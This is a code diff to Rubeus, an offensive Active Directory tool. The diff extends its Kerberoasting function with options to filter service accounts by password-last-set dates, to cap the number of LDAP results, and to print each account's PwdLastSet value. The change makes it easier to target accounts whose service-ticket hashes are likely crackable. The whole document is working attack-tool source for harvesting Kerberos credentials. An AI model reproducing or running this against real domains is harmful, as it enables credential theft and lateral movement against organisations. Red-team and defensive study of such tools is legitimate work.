@@ -264,7 +264,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4")
+        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", int resultLimit = 0)
         {
             Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");
 
@@ -460,10 +460,27 @@ namespace Rubeus
                     //  But apparently Microsoft is silly and doesn't really follow their own docs and RC4 is always returned regardless ¯\_(ツ)_/¯
                     //      so this fine-grained filtering is not needed
 
-
-                    // samAccountType=805306368                                 ->  user account
-                    // serviceprincipalname=*                                   ->  non-null SPN
-                    string userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
+                    string userSearchFilter = "";
+                    if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))
+                    {
+                        if (String.IsNullOrEmpty(pwdSetAfter))
+                        {
+                            pwdSetAfter = "01-01-1601";
+                        }
+                        if (String.IsNullOrEmpty(pwdSetBefore))
+                        {
+                            pwdSetBefore = "01-01-2100";
+                        }
+                        Console.WriteLine("[*] Searching for accounts with lastpwdset from "+pwdSetAfter+" to "+ pwdSetBefore);
+                        DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);
+                        DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);
+                        string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";
+                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);
+                    }
+                    else
+                    {
+                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
+                    }
                     userSearcher.Filter = userSearchFilter;
                 }
                 catch (Exception ex)
@@ -474,6 +491,12 @@ namespace Rubeus
 
                 try
                 {
+                    if (resultLimit > 0)
+                    {
+                        userSearcher.SizeLimit = resultLimit;
+                        Console.WriteLine("[*] Up to {0} result(s) will be returned", resultLimit.ToString());
+                    }
+
                     SearchResultCollection users = userSearcher.FindAll();
 
                     if (users.Count == 0)
@@ -490,6 +513,8 @@ namespace Rubeus
                         string samAccountName = user.Properties["samAccountName"][0].ToString();
                         string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                         string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
+                        long lastPwdSet = (long)(user.Properties["pwdlastset"][0]);
+                        DateTime pwdLastSet = DateTime.FromFileTimeUtc(lastPwdSet);
                         Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
                         if (user.Properties.Contains("msDS-SupportedEncryptionTypes"))
                         {
@@ -498,6 +523,7 @@ namespace Rubeus
                         Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                         Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                         Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
+                        Console.WriteLine("[*] PwdLastSet             : {0}", pwdLastSet);
                         Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);
 
                         if (!String.IsNullOrEmpty(domain))
